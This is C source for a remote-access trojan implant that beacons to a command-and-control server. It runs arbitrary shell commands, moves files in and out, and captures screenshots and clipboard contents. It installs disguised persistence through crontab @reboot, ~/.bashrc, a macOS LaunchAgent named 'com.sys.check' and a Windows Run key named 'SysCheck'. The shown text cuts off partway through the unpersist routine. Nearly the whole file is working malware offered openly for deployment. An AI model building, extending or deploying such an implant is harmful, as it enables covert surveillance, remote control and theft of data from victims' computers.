// ─────────────────────────────────────────────────────────────────────────────
// implant_beacon.c  —  C implant for RAT/BeaconUI
//
// Build:
//   sudo apt install libcurl4-openssl-dev libssl-dev
//   make          (uses Makefile in the same directory)
//   — or manually —
//   gcc -O2 -Wall -o implant_beacon implant_beacon.c
//       $(pkg-config --cflags --libs libcurl openssl) -lpthread -lm
//
// Supported tasks (17):
//   execute, upload, download, set_interval,
//   screenshot (scrot/import), webcam_snap (fswebcam/ffmpeg),
//   mic_record (arecord/ffmpeg), clipboard (xclip/xsel/wl-paste),
//   persist (crontab/bashrc), unpersist,
//   privesc_enum, sysinfo, ps, ls, netstat, kill_process, self_destruct
//
// Author: Israel Fernandez
// ─────────────────────────────────────────────────────────────────────────────

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <time.h>
#include <math.h>
#include <errno.h>
#include <signal.h>
#include <ctype.h>
#include <limits.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <pwd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <curl/curl.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#ifndef _WIN32
#  include <linux/videodev2.h>
#endif

/* stb_image_write — single-header JPEG encoder (no libjpeg needed) */
#define STB_IMAGE_WRITE_IMPLEMENTATION
#define STBI_WRITE_NO_STDIO
#include "stb_image_write.h"

// ── Platform detection ────────────────────────────────────────────────────────
#if defined(_WIN32)
#   include <windows.h>
#   define PLATFORM_NAME "Windows"
#elif defined(__APPLE__)
#   include <mach-o/dyld.h>
#   include <sys/sysctl.h>
#   define PLATFORM_NAME "macOS"
#else
#   define PLATFORM_NAME "Linux"
#endif

// ── Configuration ─────────────────────────────────────────────────────────────
// All compile-time defaults can be overridden via -D flags, e.g.:
//   -DC2_URL_0='"https://myc2.example.com:9443"'
//   -DDEFAULT_INTERVAL=5  -DJITTER_FACTOR=0.0

#ifndef C2_URL_0
#define C2_URL_0 "https://localhost:9443"
#endif
static const char *C2_URLS[] = { C2_URL_0 };
#define C2_URL_COUNT 1

/* Paths are relative to the implant binary; adjust for deployment. */
#ifndef CA_CERT
#define CA_CERT     "../C2/ca.crt"
#endif
#ifndef CLIENT_CERT
#define CLIENT_CERT "../C2/c2.crt"
#endif
#ifndef CLIENT_KEY
#define CLIENT_KEY  "../C2/c2.key"
#endif

/* Same key as in c2_beacon.py / implant_beacon.py */
static const char ENDPOINT_KEY[] =
    "41447568f68e1377515ec0dfa4bd5918"
    "a7dcbb5cad1a901ad708a3b7e49e273b"
    "f48e850784d094a2b1bb5f460a7a8912"
    "21f96699c06a0705528afd3c0f2961fd";

#ifndef DEFAULT_INTERVAL
#define DEFAULT_INTERVAL  20    /* seconds between check-ins                */
#endif
#ifndef JITTER_FACTOR
#define JITTER_FACTOR     0.20  /* ±20 % randomisation                      */
#endif
#define MAX_FAILURES      3     /* consecutive failures before URL rotation  */
#define CMD_TIMEOUT_SEC   120   /* wall-clock cap for execute tasks          */

// ── Global state ──────────────────────────────────────────────────────────────

static char  IMPLANT_ID[37]   = {0};
static int   beacon_interval  = DEFAULT_INTERVAL;
static int   c2_index         = 0;
static int   consecutive_fails = 0;
volatile int g_self_destruct  = 0;

/* HMAC-derived endpoint slugs — populated by derive_endpoints() */
static char SLUG_REG[17]  = {0};
static char SLUG_TASK[17] = {0};
static char SLUG_RES[17]  = {0};

// ── Dynamic string ─────────────────────────────────────────────────────────────

typedef struct { char *d; size_t len; size_t cap; } str_t;

static void str_init(str_t *s)  { s->d = calloc(1,1); s->len=0; s->cap=1; }
static void str_free(str_t *s)  { free(s->d); s->d=NULL; s->len=s->cap=0; }

static void str_append(str_t *s, const char *buf, size_t n) {
    if (s->len + n + 1 > s->cap) {
        s->cap = (s->len + n + 1) * 2;
        s->d = realloc(s->d, s->cap);
    }
    memcpy(s->d + s->len, buf, n);
    s->len += n;
    s->d[s->len] = '\0';
}
static void str_cat(str_t *s, const char *z)  { str_append(s, z, strlen(z)); }
static void str_fmt(str_t *s, const char *fmt, ...) {
    char buf[8192];
    va_list ap; va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) str_append(s, buf, (size_t)(n < (int)sizeof(buf)-1 ? n : (int)sizeof(buf)-2));
}

// ── Base64 ────────────────────────────────────────────────────────────────────

static const char B64T[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/* Returns malloc'd NUL-terminated base64 string.  Caller frees. */
static char *b64_enc(const unsigned char *data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3);
    char *out = malloc(out_len + 1);
    size_t i = 0, j = 0;
    while (i < len) {
        unsigned int b0 = data[i++];
        unsigned int b1 = (i < len) ? data[i++] : 0;
        unsigned int b2 = (i < len) ? data[i++] : 0;
        unsigned int v  = (b0 << 16) | (b1 << 8) | b2;
        out[j++] = B64T[(v >> 18) & 0x3F];
        out[j++] = B64T[(v >> 12) & 0x3F];
        out[j++] = B64T[(v >>  6) & 0x3F];
        out[j++] = B64T[(v      ) & 0x3F];
    }
    size_t pad = (3 - len % 3) % 3;
    for (size_t k = 0; k < pad; k++) out[out_len - 1 - k] = '=';
    out[out_len] = '\0';
    return out;
}

/* Returns malloc'd decoded bytes.  Sets *out_len.  Caller frees. */
static unsigned char *b64_dec(const char *in, size_t *out_len) {
    static unsigned char tbl[256];
    static int init = 0;
    if (!init) {
        memset(tbl, 0xFF, 256);
        for (int i = 0; i < 64; i++) tbl[(unsigned char)B64T[i]] = (unsigned char)i;
        init = 1;
    }
    size_t il = strlen(in);
    size_t pad = 0;
    if (il > 0 && in[il-1] == '=') pad++;
    if (il > 1 && in[il-2] == '=') pad++;
    *out_len = il * 3 / 4 - pad;
    unsigned char *out = malloc(*out_len + 1);
    size_t j = 0;
    for (size_t i = 0; i + 3 < il; i += 4) {
        unsigned int v =
            ((unsigned int)tbl[(unsigned char)in[i  ]] << 18) |
            ((unsigned int)tbl[(unsigned char)in[i+1]] << 12) |
            ((unsigned int)tbl[(unsigned char)in[i+2]] <<  6) |
            ((unsigned int)tbl[(unsigned char)in[i+3]]);
        if (j < *out_len) out[j++] = (v >> 16) & 0xFF;
        if (j < *out_len) out[j++] = (v >>  8) & 0xFF;
        if (j < *out_len) out[j++] = (v      ) & 0xFF;
    }
    out[*out_len] = '\0';
    return out;
}

// ── JSON utilities ────────────────────────────────────────────────────────────

/* Escape a string for use inside a JSON double-quoted value.
   Returns malloc'd string — caller frees. */
static char *json_esc(const char *s) {
    if (!s) return strdup("");
    str_t out; str_init(&out);
    for (const char *p = s; *p; p++) {
        switch ((unsigned char)*p) {
            case '"':  str_cat(&out, "\\\""); break;
            case '\\': str_cat(&out, "\\\\"); break;
            case '\n': str_cat(&out, "\\n");  break;
            case '\r': str_cat(&out, "\\r");  break;
            case '\t': str_cat(&out, "\\t");  break;
            default:
                if ((unsigned char)*p < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", (unsigned char)*p);
                    str_cat(&out, buf);
                } else {
                    str_append(&out, p, 1);
                }
        }
    }
    return out.d; /* caller owns the heap memory */
}

/* Extract a quoted string value for key.  Returns malloc'd string or NULL. */
static char *json_str(const char *json, const char *key) {
    if (!json) return NULL;
    char search[256];
    snprintf(search, sizeof(search), "\"%s\":", key);
    const char *p = strstr(json, search);
    if (!p) return NULL;
    p += strlen(search);
    while (*p == ' ') p++;
    if (strncmp(p, "null", 4) == 0) return NULL;
    if (*p != '"') return NULL;
    p++;
    str_t out; str_init(&out);
    while (*p && *p != '"') {
        if (*p == '\\' && *(p+1)) {
            p++;
            switch (*p) {
                case 'n': str_append(&out, "\n", 1); break;
                case 'r': str_append(&out, "\r", 1); break;
                case 't': str_append(&out, "\t", 1); break;
                default:  str_append(&out, p,   1);
            }
        } else {
            str_append(&out, p, 1);
        }
        p++;
    }
    return out.d;
}

/* Extract integer value.  Returns def if key not found. */
static int json_int(const char *json, const char *key, int def) {
    if (!json) return def;
    char search[256];
    snprintf(search, sizeof(search), "\"%s\":", key);
    const char *p = strstr(json, search);
    if (!p) return def;
    p += strlen(search);
    while (*p == ' ') p++;
    if (!isdigit((unsigned char)*p) && *p != '-') return def;
    return atoi(p);
}

/* Extract a nested JSON object or array for key.
   Returns malloc'd {..} / [..] string, or NULL.  Caller frees. */
static char *json_obj(const char *json, const char *key) {
    if (!json) return NULL;
    char search[256];
    snprintf(search, sizeof(search), "\"%s\":", key);
    const char *p = strstr(json, search);
    if (!p) return NULL;
    p += strlen(search);
    while (*p == ' ') p++;
    if (strncmp(p, "null", 4) == 0) return NULL;
    char open, close;
    if      (*p == '{') { open='{'; close='}'; }
    else if (*p == '[') { open='['; close=']'; }
    else return NULL;
    const char *start = p;
    int depth=0, in_str=0;
    while (*p) {
        if (in_str) {
            if (*p=='\\') p++;
            else if (*p=='"') in_str=0;
        } else {
            if      (*p=='"')   in_str=1;
            else if (*p==open)  depth++;
            else if (*p==close) { if (--depth==0) { p++; break; } }
        }
        if (*p) p++;
    }
    return (depth == 0) ? strndup(start, (size_t)(p - start)) : NULL;
}

// ── Result builders ────────────────────────────────────────────────────────────

static char *res_ok(int tid, const char *type, const char *output) {
    char *et = json_esc(type);
    char *eo = json_esc(output ? output : "");
    str_t j; str_init(&j);
    /* Use str_cat for output — str_fmt has an 8192-byte buffer and would
       silently truncate large outputs (netstat, privesc_enum, ps, etc.) */
    str_fmt(&j, "{\"task_id\":%d,\"type\":\"%s\",\"ok\":true,\"output\":\"", tid, et);
    str_cat(&j, eo);
    str_cat(&j, "\"}");
    free(et); free(eo);
    return j.d;
}

static char *res_err(int tid, const char *type, const char *error) {
    char *et = json_esc(type);
    char *ee = json_esc(error ? error : "error");
    str_t j; str_init(&j);
    str_fmt(&j, "{\"task_id\":%d,\"type\":\"%s\",\"ok\":false,\"error\":\"", tid, et);
    str_cat(&j, ee);
    str_cat(&j, "\"}");
    free(et); free(ee);
    return j.d;
}

static char *res_ok_data(int tid, const char *type, const char *b64,
                          const char *fmt, const char *filepath) {
    char *et = json_esc(type);
    str_t j; str_init(&j);
    /* Do NOT use str_fmt for b64 — its vsnprintf buf is 8192 bytes and
       would silently truncate large base64 payloads (images, audio). */
    str_fmt(&j, "{\"task_id\":%d,\"type\":\"%s\",\"ok\":true,\"data\":\"", tid, et);
    str_cat(&j, b64);   /* b64 can be hundreds of KB */
    str_cat(&j, "\"");
    if (fmt)      { char *ef = json_esc(fmt);      str_fmt(&j, ",\"format\":\"%s\"",   ef); free(ef); }
    if (filepath) { char *ep = json_esc(filepath); str_fmt(&j, ",\"filepath\":\"%s\"", ep); free(ep); }
    str_cat(&j, "}");
    free(et);
    return j.d;
}

// ── curl helpers ──────────────────────────────────────────────────────────────

static size_t curl_write_cb(char *ptr, size_t sz, size_t nmemb, void *ud) {
    str_t *s = (str_t *)ud;
    str_append(s, ptr, sz * nmemb);
    return sz * nmemb;
}

static CURL *curl_setup_handle(void) {
    CURL *c = curl_easy_init();
    if (!c) return NULL;
    curl_easy_setopt(c, CURLOPT_CAINFO,          CA_CERT);
    curl_easy_setopt(c, CURLOPT_SSLCERT,         CLIENT_CERT);
    curl_easy_setopt(c, CURLOPT_SSLKEY,          CLIENT_KEY);
    curl_easy_setopt(c, CURLOPT_SSL_VERIFYHOST,  0L); /* self-signed cert */
    curl_easy_setopt(c, CURLOPT_SSL_VERIFYPEER,  1L);
    curl_easy_setopt(c, CURLOPT_TIMEOUT,         15L);
    curl_easy_setopt(c, CURLOPT_CONNECTTIMEOUT,  8L);
    curl_easy_setopt(c, CURLOPT_WRITEFUNCTION,   curl_write_cb);
    return c;
}

/* Returns malloc'd body, NULL on curl/TLS error. *code set to HTTP status. */
static char *http_get_ex(const char *url, long *code) {
    CURL *c = curl_setup_handle();
    if (!c) { *code=0; return NULL; }
    str_t body; str_init(&body);
    curl_easy_setopt(c, CURLOPT_URL,       url);
    curl_easy_setopt(c, CURLOPT_WRITEDATA, &body);
    CURLcode rc = curl_easy_perform(c);
    curl_easy_getinfo(c, CURLINFO_RESPONSE_CODE, code);
    curl_easy_cleanup(c);
    if (rc != CURLE_OK) { str_free(&body); return NULL; }
    return body.d;
}

/* Returns malloc'd body, NULL on error or non-2xx response. */
static char *http_post(const char *url, const char *json_body) {
    CURL *c = curl_setup_handle();
    if (!c) return NULL;
    struct curl_slist *hdrs = curl_slist_append(NULL, "Content-Type: application/json");
    str_t body; str_init(&body);
    curl_easy_setopt(c, CURLOPT_URL,        url);
    curl_easy_setopt(c, CURLOPT_POST,       1L);
    curl_easy_setopt(c, CURLOPT_POSTFIELDS, json_body);
    curl_easy_setopt(c, CURLOPT_HTTPHEADER, hdrs);
    curl_easy_setopt(c, CURLOPT_WRITEDATA,  &body);
    CURLcode rc = curl_easy_perform(c);
    long code = 0; curl_easy_getinfo(c, CURLINFO_RESPONSE_CODE, &code);
    curl_slist_free_all(hdrs);
    curl_easy_cleanup(c);
    if (rc != CURLE_OK || code >= 400) { str_free(&body); return NULL; }
    return body.d;
}

// ── HMAC endpoint derivation ──────────────────────────────────────────────────

static void derive_endpoints(void) {
    const char *labels[] = { "register", "tasks", "results" };
    char *slugs[] = { SLUG_REG, SLUG_TASK, SLUG_RES };
    size_t key_len = strlen(ENDPOINT_KEY);
    unsigned char digest[32];
    unsigned int dlen = 32;
    for (int i = 0; i < 3; i++) {
        HMAC(EVP_sha256(), ENDPOINT_KEY, (int)key_len,
             (const unsigned char *)labels[i], strlen(labels[i]),
             digest, &dlen);
        for (int j = 0; j < 8; j++)
            snprintf(slugs[i] + j*2, 3, "%02x", digest[j]);
        slugs[i][16] = '\0';
    }
}

// ── UUID ──────────────────────────────────────────────────────────────────────

static void uuid_gen(char out[37]) {
    unsigned char b[16];
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0 || read(fd, b, 16) != 16) {
        if (fd >= 0) close(fd);
        snprintf(out, 37, "00000000-0000-4000-8000-000000000000");
        return;
    }
    close(fd);
    b[6] = (b[6] & 0x0F) | 0x40; /* version 4 */
    b[8] = (b[8] & 0x3F) | 0x80; /* variant 1 */
    snprintf(out, 37,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        b[0],b[1],b[2],b[3], b[4],b[5], b[6],b[7],
        b[8],b[9], b[10],b[11],b[12],b[13],b[14],b[15]);
}

// ── Shell execution ───────────────────────────────────────────────────────────

/* Run cmd via popen, capture stdout+stderr.  Returns malloc'd output. */
static char *run_cmd(const char *cmd) {
    str_t out; str_init(&out);
    char buf[4096];
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        str_cat(&out, strerror(errno));
        return out.d;
    }
    while (fgets(buf, sizeof(buf), fp)) str_cat(&out, buf);
    pclose(fp);
    return out.d;
}

// ── Self-path helper ──────────────────────────────────────────────────────────
/* Fills buf with the absolute path of the running executable. */
static void get_self_path(char *buf, size_t sz) {
    buf[0] = '\0';
#if defined(_WIN32)
    GetModuleFileNameA(NULL, buf, (DWORD)sz);
#elif defined(__APPLE__)
    uint32_t len = (uint32_t)sz;
    if (_NSGetExecutablePath(buf, &len) != 0)
        strncpy(buf, "./implant_beacon", sz - 1);
    else {
        char resolved[PATH_MAX];
        if (realpath(buf, resolved)) strncpy(buf, resolved, sz - 1);
    }
#else
    if (readlink("/proc/self/exe", buf, sz - 1) < 0)
        strncpy(buf, "./implant_beacon", sz - 1);
#endif
    buf[sz - 1] = '\0';
}

// ── Task handlers ─────────────────────────────────────────────────────────────

/* execute ------------------------------------------------------------------- */
static char *h_execute(const char *task, int tid) {
    char *cmd = json_str(task, "command");
    if (!cmd || !cmd[0]) { free(cmd); return res_err(tid,"execute","No command provided"); }
    char shell_cmd[8192];
    /* Do NOT wrap in "sh -c <cmd>" — that treats cmd as the script name ($0).
       popen() already uses /bin/sh -c internally, so passing the raw command
       string here executes it correctly including pipes, quotes, and builtins. */
    snprintf(shell_cmd, sizeof(shell_cmd),
             "timeout %d %s 2>&1", CMD_TIMEOUT_SEC, cmd);
    char *output = run_cmd(shell_cmd);
    char *result = res_ok(tid, "execute", output);
    free(cmd); free(output);
    return result;
}

/* upload -------------------------------------------------------------------- */
static char *h_upload(const char *task, int tid) {
    char *filename = json_str(task, "filename");
    char *b64      = json_str(task, "file");
    if (!filename || !b64) {
        free(filename); free(b64);
        return res_err(tid, "upload", "Missing filename or file");
    }
    size_t data_len;
    unsigned char *data = b64_dec(b64, &data_len);
    char msg[512]; char *result;
    FILE *f = fopen(filename, "wb");
    if (!f) {
        snprintf(msg, sizeof(msg), "Cannot open %s: %s", filename, strerror(errno));
        result = res_err(tid, "upload", msg);
    } else {
        fwrite(data, 1, data_len, f);
        fclose(f);
        snprintf(msg, sizeof(msg), "Wrote %zu bytes to %s", data_len, filename);
        result = res_ok(tid, "upload", msg);
    }
    free(filename); free(b64); free(data);
    return result;
}

/* download ------------------------------------------------------------------ */
static char *h_download(const char *task, int tid) {
    char *filepath = json_str(task, "filepath");
    if (!filepath) return res_err(tid, "download", "No filepath");
    FILE *f = fopen(filepath, "rb");
    if (!f) {
        char msg[512];
        snprintf(msg, sizeof(msg), "%s: %s", filepath, strerror(errno));
        free(filepath);
        return res_err(tid, "download", msg);
    }
    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
    unsigned char *buf = malloc((size_t)sz + 1);
    size_t nr = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    char *b64    = b64_enc(buf, nr);
    char *result = res_ok_data(tid, "download", b64, NULL, filepath);
    free(filepath); free(buf); free(b64);
    return result;
}

/* set_interval -------------------------------------------------------------- */
static char *h_set_interval(const char *task, int tid) {
    int iv = json_int(task, "interval", 0);
    if (iv < 1) return res_err(tid, "set_interval", "Invalid interval (must be >= 1)");
    beacon_interval = iv;
    char msg[64];
    snprintf(msg, sizeof(msg), "Beacon interval set to %ds", iv);
    return res_ok(tid, "set_interval", msg);
}

/* screenshot ---------------------------------------------------------------- */
static char *h_screenshot(const char *task, int tid) {
    (void)task;
    const char *tmp = "/tmp/.c2_snap.png";
    char cmd[512];

#if defined(__APPLE__)
    /* screencapture is built-in on macOS (-x = no sound) */
    snprintf(cmd, sizeof(cmd), "screencapture -x '%s' 2>&1", tmp);
    char *out = run_cmd(cmd); free(out);
#elif defined(_WIN32)
    /* PowerShell GDI screenshot */
    snprintf(cmd, sizeof(cmd),
        "powershell -NoProfile -Command \""
        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
        "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
        "$bmp=New-Object Drawing.Bitmap $b.Width,$b.Height;"
        "$g=[Drawing.Graphics]::FromImage($bmp);"
        "$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);"
        "$bmp.Save('%s');$g.Dispose();$bmp.Dispose()\"",
        tmp);
    char *out = run_cmd(cmd); free(out);
#else
    /* Linux: try scrot → ImageMagick import → gnome-screenshot */
    snprintf(cmd, sizeof(cmd), "scrot '%s' 2>&1", tmp);
    char *out = run_cmd(cmd); free(out);

    /* Fallback: ImageMagick import */
    if (access(tmp, F_OK) != 0) {
        snprintf(cmd, sizeof(cmd), "import -window root '%s' 2>&1", tmp);
        out = run_cmd(cmd); free(out);
    }
    /* Fallback: gnome-screenshot */
    if (access(tmp, F_OK) != 0) {
        snprintf(cmd, sizeof(cmd), "gnome-screenshot -f '%s' 2>&1", tmp);
        out = run_cmd(cmd); free(out);
    }
#endif /* platform screenshot */

    FILE *f = fopen(tmp, "rb");
    if (!f) return res_err(tid, "screenshot",
#if defined(__APPLE__)
                           "screenshot failed: screencapture unavailable"
#elif defined(_WIN32)
                           "screenshot failed: PowerShell unavailable"
#else
                           "screenshot failed: install scrot or imagemagick"
#endif
    );
    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
    unsigned char *buf = malloc((size_t)sz);
    size_t nr = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    unlink(tmp);
    char *b64    = b64_enc(buf, nr);
    char *result = res_ok_data(tid, "screenshot", b64, "png", NULL);
    free(buf); free(b64);
    return result;
}

/* clipboard ----------------------------------------------------------------- */
static char *h_clipboard(const char *task, int tid) {
    (void)task;
#if defined(__APPLE__)
    static const char *tools[] = {
        "pbpaste 2>/dev/null",
        "osascript -e 'the clipboard' 2>/dev/null",
        NULL
    };
    const char *errmsg = "No clipboard tool available (pbpaste should be built-in on macOS)";
#elif defined(_WIN32)
    static const char *tools[] = {
        "powershell -NoProfile -Command Get-Clipboard 2>NUL",
        NULL
    };
    const char *errmsg = "No clipboard tool available (requires PowerShell)";
#else
    static const char *tools[] = {
        /* timeout 5 prevents xclip from hanging indefinitely when no X owner holds the clipboard */
        "timeout 5 xclip -selection clipboard -o 2>/dev/null",
        "timeout 5 xsel --clipboard --output 2>/dev/null",
        "timeout 5 wl-paste 2>/dev/null",
        NULL
    };
    const char *errmsg = "No clipboard tool available (install xclip, xsel, or wl-paste)";
#endif
    for (int i = 0; tools[i]; i++) {
        char *out = run_cmd(tools[i]);
        if (out && out[0]) {
            char *r = res_ok(tid, "clipboard", out);
            free(out);
            return r;
        }
        free(out);
    }
    return res_err(tid, "clipboard", errmsg);
}

/* persist ------------------------------------------------------------------- */
static char *h_persist(const char *task, int tid) {
    char *method = json_str(task, "method");
#if defined(__APPLE__)
    if (!method) method = strdup("launchagent");
#elif defined(_WIN32)
    if (!method) method = strdup("registry");
#else
    if (!method) method = strdup("crontab");
#endif

    char self[PATH_MAX] = {0};
    get_self_path(self, sizeof(self));

    char msg[1024]; char *result;

#if defined(_WIN32)
    /* ── Windows: registry run key ── */
    if (strcmp(method, "registry") == 0) {
        HKEY key;
        char val[PATH_MAX + 4];
        snprintf(val, sizeof(val), "\"%s\"", self);
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                          "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0, KEY_SET_VALUE | KEY_READ, &key) == ERROR_SUCCESS) {
            RegSetValueExA(key, "SysCheck", 0, REG_SZ,
                           (const BYTE *)val, (DWORD)(strlen(val) + 1));
            RegCloseKey(key);
            result = res_ok(tid, "persist", "Installed in HKCU\\...\\Run (SysCheck)");
        } else {
            result = res_err(tid, "persist", "RegOpenKeyEx failed");
        }
    } else {
        snprintf(msg, sizeof(msg), "Unknown method: %s (Windows: registry)", method);
        result = res_err(tid, "persist", msg);
    }

#elif defined(__APPLE__)
    /* ── macOS: LaunchAgent, crontab, or bashrc ── */
    if (strcmp(method, "launchagent") == 0) {
        const char *home = getenv("HOME"); if (!home) home = "/tmp";
        char plist_dir[PATH_MAX], plist_path[PATH_MAX];
        snprintf(plist_dir,  sizeof(plist_dir),  "%s/Library/LaunchAgents", home);
        snprintf(plist_path, sizeof(plist_path), "%s/com.sys.check.plist", plist_dir);
        /* mkdir -p */
        char mk[PATH_MAX + 32];
        snprintf(mk, sizeof(mk), "mkdir -p '%s' 2>/dev/null", plist_dir);
        char *mko = run_cmd(mk); free(mko);
        /* Already installed? */
        if (access(plist_path, F_OK) == 0) {
            result = res_ok(tid, "persist", "Already persisted as LaunchAgent");
        } else {
            FILE *f = fopen(plist_path, "w");
            if (!f) {
                result = res_err(tid, "persist", strerror(errno));
            } else {
                fprintf(f,
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\""
                    " \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
                    "<plist version=\"1.0\"><dict>\n"
                    "  <key>Label</key><string>com.sys.check</string>\n"
                    "  <key>ProgramArguments</key><array>\n"
                    "    <string>%s</string>\n"
                    "  </array>\n"
                    "  <key>RunAtLoad</key><true/>\n"
                    "  <key>KeepAlive</key><true/>\n"
                    "</dict></plist>\n", self);
                fclose(f);
                char load_cmd[PATH_MAX + 64];
                snprintf(load_cmd, sizeof(load_cmd),
                         "launchctl load '%s' 2>/dev/null", plist_path);
                char *lo = run_cmd(load_cmd); free(lo);
                snprintf(msg, sizeof(msg), "Installed LaunchAgent: %s", plist_path);
                result = res_ok(tid, "persist", msg);
            }
        }
    } else if (strcmp(method, "crontab") == 0 || strcmp(method, "bashrc") == 0) {
        goto persist_posix; /* shared code below */
    } else {
        snprintf(msg, sizeof(msg), "Unknown method: %s (macOS: launchagent, crontab, bashrc)",
                 method);
        result = res_err(tid, "persist", msg);
    }

#else
    /* ── Linux: crontab or bashrc ── */
    goto persist_posix;
    result = NULL; /* unreachable; suppress -Wunused */
#endif

#if !defined(_WIN32)
    persist_posix:
    if (strcmp(method, "crontab") == 0) {
        char *existing = run_cmd("crontab -l 2>/dev/null");
        if (existing && strstr(existing, self)) {
            result = res_ok(tid, "persist", "Already persisted in crontab");
        } else {
            char tmp[PATH_MAX + 256];
            snprintf(tmp, sizeof(tmp),
                     "(crontab -l 2>/dev/null; echo \"@reboot '%s' >/dev/null 2>&1 &\") | crontab -",
                     self);
            char *out = run_cmd(tmp); free(out);
            snprintf(msg, sizeof(msg), "Installed via crontab @reboot: %s", self);
            result = res_ok(tid, "persist", msg);
        }
        free(existing);
    } else if (strcmp(method, "bashrc") == 0) {
        const char *home = getenv("HOME"); if (!home) home = "/root";
        char bashrc[PATH_MAX];
        snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", home);
        const char *bn = strrchr(self, '/') ? strrchr(self,'/')+1 : self;
        char marker[PATH_MAX + 16];
        snprintf(marker, sizeof(marker), "# .sys_chk_%s", bn);
        char *existing = run_cmd("cat ~/.bashrc 2>/dev/null");
        int already = existing && strstr(existing, marker);
        free(existing);
        if (already) {
            result = res_ok(tid, "persist", "Already persisted in ~/.bashrc");
        } else {
            FILE *f = fopen(bashrc, "a");
            if (f) {
                fprintf(f, "\n%s\nnohup '%s' >/dev/null 2>&1 &\n", marker, self);
                fclose(f);
                result = res_ok(tid, "persist", "Installed in ~/.bashrc");
            } else {
                result = res_err(tid, "persist", strerror(errno));
            }
        }
    } else {
#if defined(__APPLE__)
        /* Already handled unknown method above */
        (void)0;
#else
        snprintf(msg, sizeof(msg), "Unknown method: %s (Linux: crontab, bashrc)", method);
        result = res_err(tid, "persist", msg);
#endif
    }
#endif /* !_WIN32 */

    free(method);
    return result;
}

/* unpersist ----------------------------------------------------------------- */
static char *h_unpersist(const char *task, int tid) {
    (void)task;
    char self[PATH_MAX] = {0};
    get_self_path(self, sizeof(self));

    str_t results; str_init(&results);

#if defined(__APPLE__)
    /* ── macOS: LaunchAgent ── */
    {
        const char *home = getenv("HOME"); if (!home) home = "/tmp";
        char plist_path[PATH_MAX];
        snprintf(plist_path, sizeof(plist_path),
                 "%s/Library/LaunchAgents/com.sys.check.plist", home);
        if (access(plist_path, F_OK) == 0) {
            char unload_cmd[PATH_MAX + 64];
            snprintf(unload_cmd, sizeof(unload_cmd),
                     "launchctl unload '%s' 2>/dev/null", plist_path);
            char *uo = run_cmd(unload_cmd); free(uo);
            unlink(plist_path);
            str_cat(&results, "launchagent: com.sys.check.plist removed\n");
        } else {
            str_cat(&results, "launchagent: no plist found\n");
        }
    }
#elif defined(_WIN32)
    /* ── Windows: registry + startup folder ── */
    {
        HKEY key;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                          "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0, KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
            if (RegDeleteValueA(key, "SysCheck") == ERROR_SUCCESS)
                str_cat(&results, "registry: SysCheck run key removed\n");
            else
                str_cat(&results, "registry: no SysCheck run key found\n");
            RegCloseKey(key);
        } else {
            str_cat(&results, "registry: could not open Run key\n");
        }
    }
    {
        const char *appdata = getenv("APPDATA");
        if (appdata) {
            char bat[MAX_PATH];
            snprintf(bat, sizeof(bat),
                     "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sys_check.bat",
                     appdata);
            if (access(bat, F_OK) == 0) {
                remove(bat);
                str_cat(&results, "startup: sys_check.bat removed\n");
            } else {
                str_cat(&results, "startup: no startup script found\n");
            }
        }
    }
    /* systemd: not applicable on Windows */
    str_cat(&results, "systemd: no service found\n");
    char *result = res_ok(tid, "unpersist", results.d);
    str_free(&results);
    return result;
#endif

    /* ── crontab ── */
    {
        char *raw = run_cmd("crontab -l 2>/dev/null");
        if (raw && strstr(raw, self)) {
            str_t cleaned; str_init(&cleaned);
            char *copy = strdup(raw);
            char *line = strtok(copy, "\n");
            while (line) {
                if (!strstr(line, self)) { str_cat(&cleaned, line); str_cat(&cleaned, "\n"); }
                line = strtok(NULL, "\n");
            }
            free(copy);
            char cmd[4096];
            snprintf(cmd, sizeof(cmd), "printf '%%s' '%s' | crontab -", cleaned.d);
            char *out = run_cmd(cmd); free(out);
            str_cat(&results, "crontab: entry removed\n");
            str_free(&cleaned);
        } else {
            str_cat(&results, "crontab: no entry found\n");
        }
        free(raw);
    }

    /* ── ~/.bashrc ── */
    {
        const char *home = getenv("HOME"); if (!home) home = "/root";
        char bashrc_path[PATH_MAX];
        snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", home);
        const char *bn = strrchr(self, '/') ? strrchr(self,'/')+1 : self;
        char marker[PATH_MAX + 16];
        snprintf(marker, sizeof(marker), "# .sys_chk_%s", bn);

        FILE *f = fopen(bashrc_path, "r");
        if (f) {
            str_t content; str_init(&content);
            char line[1024]; int skip = 0; int found = 0;
            while (fgets(line, sizeof(line), f)) {
                /* strip newline for comparison */
                char trimmed[1024]; strncpy(trimmed, line, sizeof(trimmed)-1);
